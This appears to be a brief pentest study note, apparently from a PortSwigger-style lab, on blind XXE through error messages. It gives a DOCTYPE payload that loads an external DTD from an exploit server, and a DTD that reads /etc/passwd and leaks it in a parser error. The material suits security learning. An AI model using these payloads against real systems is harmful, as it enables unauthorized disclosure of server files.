```
In Burp:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<https://exploit-0a3a008003341db7c0583a26017100e5.exploit-server.net/exploit.dtd>"> %xxe;]>

Exploit Server:
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil
```
![unnamed_86647e40b18e4005a8ee4dd0c2849917](docs/Attachments/Methodology/1.%20Enumeration/0.%20Initial%20Recon/4.%20Common%20Web%20Attack%20Techniques/XML%20attacks/XXE/File%20Read%20DTD%20Error%20Messages/{{notename}}-202605011506.png)